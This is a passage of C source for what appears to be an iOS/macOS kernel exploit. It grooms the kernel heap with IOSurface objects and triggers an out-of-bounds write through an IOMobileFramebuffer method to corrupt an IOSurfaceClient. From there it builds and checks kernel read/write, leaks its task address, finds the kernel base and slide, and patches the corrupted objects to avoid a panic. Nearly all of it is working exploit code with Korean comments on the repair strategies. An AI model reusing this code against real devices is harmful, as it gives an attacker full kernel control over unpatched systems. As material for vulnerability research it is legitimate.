[0xffffffe4cc610fa0+0x000] 41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA
[0xffffffe4cc610fa0+0x010] 41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA
[0xffffffe4cc610fa0+0x020] 41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA
[0xffffffe4cc610fa0+0x030] 41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA
[0xffffffe4cc610fa0+0x040] 88 87 86 85 40 13 39 13  38 13 37 13 41 41 41 41  |  ....@.9.8.7.AAAA <--
[0xffffffe4cc610fa0+0x050] 41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA
[0xffffffe4cc610fa0+0x060] 41 41 41 41 00 00 00 00  00 00 00 00 00 00 00 00  |  AAAA............
#endif

    int *pArr = (int*)input;
    pArr[0] = 0x3;          // sub-sub selector
    pArr[1] = 0xffffffff;   // has to be non-zero
    pArr[2] = 0x40000000;   // #iterations in the outer loop (new_from_data)
    pArr[3] = 2;
    pArr[8] = 2;
    pArr[89] = 40;        // #iterations in the inner loop (set_table)
    
    // punch hole kext.kalloc.160, free! (heap fengshui)
    // Thanks @jaakerblom for release Zer0con 2022 slide, that gives me idea!
    for (int i = 0; i < 0x1000; ++i)
    {
        uint32_t last_id = IOSurfaceRoot_create_surface_fast(iosurface_ucs[0]);
        if ((0x3400) <= (last_id * sizeof(uint64_t)))
        {
            break;
        }
    }
    for (int i = 0; i < 0x1000; ++i)
    {
        uint32_t last_id = IOSurfaceRoot_create_surface_fast(iosurface_ucs[1]);
        if ((0x3400*2) <= (last_id * sizeof(uint64_t)))
        {
            break;
        }
    }
    for (int i = 0; i < 0x1000; ++i)
    {
        uint32_t last_id = IOSurfaceRoot_create_surface_fast(iosurface_ucs[2]);
        if ((0x3400*3) <= (last_id * sizeof(uint64_t)))
        {
            break;
        }
    }
    //start
    for (int i = 0; i < 0x1000; ++i)
    {
        uint32_t last_id = IOSurfaceRoot_create_surface_fast(iosurface_uc);
        gIOSurface_ids[gIOSurface_id_count] = last_id;
        gIOSurface_id_count++;
        if ((0x3400*4) <= (last_id * sizeof(uint64_t)))
        {
            break;
        }
    }
        
    uint32_t last_free_surfid = 0;
    for (int32_t surf_idx = 0; surf_idx < gIOSurface_id_count; surf_idx++)
    {
        if(surf_idx >= 10 && surf_idx % 100 == 0) {
            IOSurfaceRoot_release_surface(iosurface_uc, gIOSurface_ids[surf_idx]);
            printf("release, iosurf_id = 0x%x\n", gIOSurface_ids[surf_idx]);
            last_free_surfid = gIOSurface_ids[surf_idx];
            gIOSurface_ids[surf_idx] = 0;
        }
    }


//    struct punch_args *punchs = malloc(sizeof(*punchs));
//    if (!punchs) return 1;
//    punchs->iosurface_uc = iosurface_uc;
//    punchs->iosurface_ids = gIOSurface_ids;
//    punchs->iosurface_id_cnt = gIOSurface_id_count;
//
//    pthread_attr_t pattr;
//    pthread_attr_init(&pattr);
//    pthread_attr_set_qos_class_np(&pattr, QOS_CLASS_USER_INITIATED, 0);
//
//    pthread_t pt1;
//    pthread_create(&pt1, &pattr, (void *(*)(void *))punch_hole, (void *)punchs);
//    pthread_join(pt1, NULL);
        
    // more spray
//    for(int i = 0; i < 10; i++) {
//        gIOSurface_ids2[i] = IOSurfaceRoot_create_surface_fast(iosurface_uc);
//        printf("gIOSurface_ids2[%u] = 0x%x\n", i, gIOSurface_ids2[i]);
//        gIOSurface_id_count2++;
//    }

    // do oob write to corrupt IOSurfaceClient
    ret = IOConnectCallMethod(iomfb_uc, 78,
                        scalars, 2,
                        input, input_size,
                        NULL, NULL,
                        NULL, NULL);

#if ENABLE_HELPER
        //find out where corruption
        for(int i = 0; i < 0x4000/8; i++) {
            uint64_t surfaceClient = tfp0_kread64(surfaceClients_ + i*8);
            if(surfaceClient != 0) {
                uint64_t sig = tfp0_kread64(surfaceClient);
                if(sig == 0x4141414141414141) {
                    puts("Found corrupted surfaceClient!");
                    tfp0_khexdump(surfaceClient, 160);
                    // spinning();
                    break;
                }
            }
        }
#endif

    // find out corrupted IOSurfaceClient's surf_id
    uint32_t krw_surf_id = 0;
    uint32_t krw_rfd = 0;
    uint32_t krw_wfd = 0;
#if 0
    for (int32_t surf_idx = gIOSurface_id_count; surf_idx >= 0; surf_idx--)
    {
        uint32_t surf_id = gIOSurface_ids[surf_idx];
        if(surf_id != 0) {
            uint32_t pipefd_leak = IOSurfaceRoot_get_surface_use_count(iosurface_uc, surf_id);
            if(pipefd_leak != 0) {
                krw_rfd = pipefd_leak & 0xffff;
                krw_wfd = (pipefd_leak >> 16) & 0xFFFF;
                printf("[+] Found corrupted IOSurfaceClient's surf_id = 0x%x\n", surf_id);
                printf("[+] pipefd_leak = 0x%x, krw_rfd = 0x%x, krw_wfd = 0x%x\n", pipefd_leak, krw_rfd, krw_wfd);

                krw_surf_id = surf_id;
                break;
            }
        }
    }
#endif
    for (int i = 0; i < 30; i++)
    {
        uint32_t surf_id = last_free_surfid - i;
        uint32_t pipefd_leak = IOSurfaceRoot_get_surface_use_count(iosurface_uc, surf_id);
        if(pipefd_leak != 0) {
            krw_rfd = pipefd_leak & 0xffff;
            krw_wfd = (pipefd_leak >> 16) & 0xFFFF;
            printf("[+] Found corrupted IOSurfaceClient's surf_id = 0x%x\n", surf_id);
            printf("[+] pipefd_leak = 0x%x, krw_rfd = 0x%x, krw_wfd = 0x%x\n", pipefd_leak, krw_rfd, krw_wfd);

            krw_surf_id = surf_id;
            break;
        }
        
        surf_id = last_free_surfid + i;
        pipefd_leak = IOSurfaceRoot_get_surface_use_count(iosurface_uc, surf_id);
        if(pipefd_leak != 0) {
            krw_rfd = pipefd_leak & 0xffff;
            krw_wfd = (pipefd_leak >> 16) & 0xFFFF;
            printf("[+] Found corrupted IOSurfaceClient's surf_id = 0x%x\n", surf_id);
            printf("[+] pipefd_leak = 0x%x, krw_rfd = 0x%x, krw_wfd = 0x%x\n", pipefd_leak, krw_rfd, krw_wfd);

            krw_surf_id = surf_id;
            break;
        }
    }

    if(krw_surf_id == 0) {
        printf("Failed to find corrupted IOSurfaceClient's surf_id... :(\n");
        printf("Reboot to try again!\n");
        spinning();
    }

    //close all pipe except krw related
    close_pipes(pipefds, total_pipes, true, krw_rfd, krw_wfd);

    //check if krw works
    kernel_rw_init(iosurface_uc, krw_surf_id, krw_rfd, krw_wfd);

    // Is kread working?
    uint64_t kaddr = KHEAP_DATA_MAPPABLE_LOC + 0x2000;
    uint64_t val = kread64(kaddr);
    printf("kaddr: 0x%llx -> val: 0x%llx\n", kaddr, val);
    if(val != 0x4242424242424242) {
        printf("kernel read failed! :(\n");
        spinning();
    }

    // Is kwrite working?
    printf("Writing 0xcafebabe13371338 to kaddr(=0x%llx)\n", kaddr);
    kwrite64(kaddr, 0xcafebabe13371338);
    val = kread64(kaddr);
    printf("kaddr: 0x%llx -> val: 0x%llx\n", kaddr, val);
    if(val != 0xcafebabe13371338) {
        printf("kernel write failed! :(\n");
        spinning();
    }
    printf("Confirmed working kernel read/write!\n");


    #define port_cnt 0x400
    mach_port_t ports[port_cnt] = {};
    // setup 400 ports
    for (int i = 0; i < port_cnt; i++) {
        ports[i] = new_mach_port();
    }

    // spray 400 kheap data ports
    int port_i = 0;
    #define POP_PORT() ports[port_i++]
    for(int i = 0; i < port_cnt; i++) {
        mach_port_t current_port = POP_PORT();
        mach_msg_size_t msg_size = message_size_for_kalloc_size(kernel_page_size) - sizeof(struct simple_msg);
        void *data = calloc(1, msg_size);
        memset(data, 0x43, msg_size);
        send_message(current_port, data, msg_size);
    }

    // find out where sprayed kmsg and obtain msgh_remote_port kaddr
    uint64_t guessed_ikm_header = KHEAP_DATA_MAPPABLE_LOC + 0x4000 * 512 + 0xfd0;
    uint64_t msgh_remote_port = 0;
    for(int i = 0; i < 100; i++) {
        // https://github.com/wh1te4ever/xnu_1day_practice/blob/main/CVE-2020-3837/helper/find_port.c#L31
        uint32_t off_mach_msg_header_t_msgh_remote_port = 0x8;    // (lldb) p/x offsetof(mach_msg_header_t, msgh_remote_port)
        uint64_t kmsgdata = guessed_ikm_header + 0x20;
        if(kread64(kmsgdata) == 0x4343434343434343) {
            msgh_remote_port = kread64(guessed_ikm_header + off_mach_msg_header_t_msgh_remote_port);
            printf("Found one of sprayed kmsg! ikm_header = 0x%llx, ikm_header->msgh_remote_port = 0x%llx\n", guessed_ikm_header, msgh_remote_port);
            break;
        }
        guessed_ikm_header += 0x4000;
    }
    if(msgh_remote_port == 0) {
        printf("Failed to find out sprayed kmsg...\n");
        spinning();
    }

    // Obtaining our task kaddr
    // msgh_remote_port's data.receiver    // 0x60 = p/x offsetof(ipc_port, data.receiver); data.receiver's type = ipc_space*
    uint64_t data_receiver = kread64(msgh_remote_port + 0x60);
    printf("data_receiver = 0x%llx\n", data_receiver);

    // data.receiver's is_task            // 0x30 = p/x offsetof(ipc_space, is_task); is_task's type = task*
    uint64_t our_task = kread64(data_receiver + 0x30);
    printf("our_task = 0x%llx\n", our_task);

    // Obtain kernel base via IOSurfaceRootUserClient_vtab
    uint64_t iosurface_port = find_port(our_task, iosurface_uc);
    uint64_t surfRoot = kread64(iosurface_port + off_ipc_port_ip_kobject);
    uint64_t IOSurfaceRootUserClient_vtab = kread64(surfRoot);
    IOSurfaceRootUserClient_vtab |= 0xffffff8000000000; // in case it has PAC
    uint64_t getExternalTrapForIndex_func = kread64(IOSurfaceRootUserClient_vtab + 8 * 0xb8);    //__ZN12IOUserClient24getTargetAndTrapForIndexEPP9IOServicej; LDR X8, [X8,#0x5C0]; 8*0xb8=0x5c0
    getExternalTrapForIndex_func |= 0xffffff8000000000;
    printf("getExternalTrapForIndex_func = 0x%llx\n", getExternalTrapForIndex_func);

    // walking down kpages to find kernel base
    uint64_t page = trunc_page_kernel(getExternalTrapForIndex_func);
    uint64_t kbase = 0;
    uint64_t kslide = 0;
    while (true) {
        if (kread64(page) == 0x0100000cfeedfacf && (kread64(page + 8) == 0x0000000200000000 || kread64(page + 8) == 0x0000000200000002)) {
            kbase = page;
            kslide = kbase - 0xfffffff007004000;
            break;
        }
        page -= kernel_page_size;
    }
    printf("kernel slide = 0x%llx, kernel base = 0x%llx\n", kslide, kbase);
    // getchar();
        
    //hexdump kbase
    khexdump(kbase, 160);

    // Clean up!
    // Fix corrupted surfaceClient to prevent kernel panic
    // Find out where corrupted surfaceClient
    uint64_t IOSurfaceRootUserClient_port = find_port(our_task, iosurface_uc);
    uint64_t IOSurfaceRootUserClient_addr = kread64(IOSurfaceRootUserClient_port + off_ipc_port_ip_kobject);
    uint64_t surfaceClients = kread64(IOSurfaceRootUserClient_addr + 0x118);

    int first_surfid = find_first_surfaceid();
    int last_surfid = find_last_surfaceid();
    // getchar();

    // for(int i = first_surfid; i <= last_surfid; i++) {
        uint64_t surfaceClient = kread64(surfaceClients + krw_surf_id*8);
        if(surfaceClient != 0) {
            uint64_t sig = kread64(surfaceClient);
            if(sig == 0x4141414141414141) {
//                printf("Found corrupted surfaceClient = 0x%llx\n", surfaceClient);
                // khexdump(surfaceClient, 160);

                // XXX: 코드를 완전히 새로 짜야함...
                /*
                    IOSurface 원래 포인터 찾는거는 못찾거나 패닉 일어나시 쉬워서
                    그냥 corrupt된 IOSurface는 가리키지 못하도록 prev와 next 포인터 고쳐서 skip하는게 맞을지도?
                    아니면 fake IOSurface 데이터를 만들어야될려나

                    해당 힙 OOB WRITE 취약점은 다음 청크, 다음 청크의 그 다음 청크 - 이렇게 해서 2개가 손상되는데,
                    이떄 3가지의 케이스가 존재한다.

                    1. surfaceClient_add_160을 surfaceClients에서 찾는데 성공하였지만, nextSurfaceClient1만 찾기 실패한 경우:
                    prevSurfaceClient1 = 0xffffffe4cc203160, nextSurfaceClient1 = 0x0
                    prevSurfaceClient2 = 0xffffffe4cc200dc0, nextSurfaceClient2 = 0xffffffe4cc203200
                    - 이런 케이스는 surfaceClients에서 맨 마지막의 surfaceClient. 맨 처음에 위치한 surfaceClient를 확인하여 next와 prev 포인터값이 어떻게 구성됐는지 확인할 것.
                    - 또는 surfaceClients에서 하나의 surfaceClient만 할당시켜서 next와 Prev 포인터값을 확인해볼것
                    - p.s: [맞음] 마지막으로 할당된 surfaceClient인 경우 nextSurfaceClient1이 0으로 나오는 것 같다! ~~
                    - [틀림] ~~ 따라서 prevSurfaceClient1의 next 포인터를 0으로 만들면 되지 않을까 싶다. 그럼 prevSurfaceClient1이 마지막으로 할당된거로 인식하게 될거고,
                    - [틀림] ~~ 추가로, surfaceClients에 손상된 surfaceClient_add_160을 못찾도록 0으로 넣어보자.
                    Solution: test_unlink_last_IOSurfaceClient


                    2. surfaceClient_add_160을 surfaceClients에서 찾는데 실패한 경우 (또는 prevSurfaceClient1, nextSurfaceClient1 둘다 0인 경우)
                    IOSurfaceClient가 할당되지 않았거나 아예 free된 경우로 추측됨.
                    이런 경우 zone poisoning에 의해 기록된 값 - 즉, 정상적으로 free되었다고 알리기 위해 카나리를 넣거나 0으로 해당 청크 데이터를 도배해볼것
                    Solution: I think, NOT exist... just reboot

                    3. prevSurfaceClient1, nextSurfaceClient1 둘다 찾는데 성공한 경우:
                    각각 2개의 surfaceCLient들의 prev와 next 포인터 고쳐서 손상된 surfaceClient를 넘기도록 skip하도록 만들어보자.
                    그리고 surfaceClients에 손상된 surfaceClient를 못찾도록 0으로 넣어보자.  [POSSIBLE!]
                    Solution: test_relink_IOSurfaceClient

                    P.s. prevSurfaceClient2, nextSurfaceClient2는 거의 항상 높은 확률로 찾을 수 있다고 보면 된다.
                    마찬가지로 3번 방법과 같이 ㄱㄱ
                    Solution: test_relink_IOSurfaceClient
                */
                uint64_t surfaceClient_add_160 = surfaceClient+160;
                for(int j = first_surfid; j <= last_surfid; j++) {
                    uint64_t currentSurfaceClient = kread64(surfaceClients + j*8);
                    if(currentSurfaceClient == surfaceClient_add_160) {
                        uint64_t prevSurfaceClient = find_prev_surfaceclient(surfaceClients, surfaceClient_add_160, first_surfid, last_surfid);
                        uint64_t nextSurfaceClient = find_next_surfaceclient(surfaceClients, surfaceClient_add_160, last_surfid, last_surfid);

                        if(prevSurfaceClient != 0 && nextSurfaceClient != 0) {
                            //solution: test_relink_IOSurfaceClient solution
                            kwrite64(prevSurfaceClient+0x20, nextSurfaceClient+0x18);    //overwrite next ptr;
                            kwrite64(nextSurfaceClient+0x18, prevSurfaceClient);    //overwrite prev ptr;
                        } else if(prevSurfaceClient != 0 && nextSurfaceClient == 0) {
                            //solution: test_unlink_last_IOSurfaceClient
                            uint64_t surfaceClientNextPtrEnd = kread64(prevSurfaceClient + 0x10) + 0x108;
                            kwrite64(prevSurfaceClient+0x20, surfaceClientNextPtrEnd);    //overwrite next ptr; 여기서 next ptr는 끝이라는 의미를 부여하기 위해 prevSurfaceClient에서 +0x10을 읽은 커널 주소에 +0x108을 더해 집어넣기
                            kwrite64(surfaceClientNextPtrEnd, prevSurfaceClient);            //surfaceClientNextPtrEnd에서 prev가 prevSurfaceClient로 되도록 수정.
                        } else {
                            printf("Relinking IOSurfaceClient encountered issues for now; prevSurfaceClient = 0x%llx, nextSurfaceClient = 0x%llx, surfaceClient_add_160 = 0x%llx\n", prevSurfaceClient, nextSurfaceClient, surfaceClient_add_160);
                            printf("but continuing anyway...\n");
                            sleep(1);
                            break;
                        }
                        remove_surfaceclient_in_surfaceclients(surfaceClients, surfaceClient_add_160, first_surfid, last_surfid);
                        printf("Fixed surfaceClient_add_160 to be non-exist in surfaceClients\n");
                        break;
                    }
                }

                uint64_t prevSurfaceClient = find_prev_surfaceclient(surfaceClients, surfaceClient, first_surfid, last_surfid);
                uint64_t nextSurfaceClient = find_next_surfaceclient(surfaceClients, surfaceClient, first_surfid, last_surfid);
                if(prevSurfaceClient != 0 && nextSurfaceClient != 0) {
                    //solution: test_relink_IOSurfaceClient solution
                    kwrite64(prevSurfaceClient+0x20, nextSurfaceClient+0x18);    //overwrite next ptr;
                    kwrite64(nextSurfaceClient+0x18, prevSurfaceClient);    //overwrite prev ptr;
                } else if(prevSurfaceClient != 0 && nextSurfaceClient == 0) {
                    //solution: test_unlink_last_IOSurfaceClient
                    uint64_t surfaceClientNextPtrEnd = kread64(prevSurfaceClient + 0x10) + 0x108;
                    kwrite64(prevSurfaceClient+0x20, surfaceClientNextPtrEnd);    //overwrite next ptr; 여기서 next ptr는 끝이라는 의미를 부여하기 위해 prevSurfaceClient에서 +0x10을 읽은 커널 주소에 +0x108을 더해 집어넣기
                    kwrite64(surfaceClientNextPtrEnd, prevSurfaceClient);            //surfaceClientNextPtrEnd에서 prev가 prevSurfaceClient로 되도록 수정.
                } else {
                    printf("Relinking IOSurfaceClient encountered issues for now; prevSurfaceClient = 0x%llx, nextSurfaceClient = 0x%llx, surfaceClient = 0x%llx\n", prevSurfaceClient, nextSurfaceClient, surfaceClient);
                    printf("but continuing anyway...\n");
                    sleep(1);
                }
                remove_surfaceclient_in_surfaceclients(surfaceClients, surfaceClient, first_surfid, last_surfid);
                printf("Fixed corrupted surfaceClient to be non-exist in surfaceClients\n");

                // break;
            } else {
                printf("corrupted surfaceClient doesn't match with sig, surfaceClient = 0x%llx\n", surfaceClient);
                spinning();
            }
        }
    // }

    IOServiceClose(iosurface_uc);
    printf("done!\n");


cleanup:
#if ENABLE_HELPER
        term_kexecute();
        mach_port_deallocate(mach_task_self(), tfp0);
    }
#endif
    return 0;
}
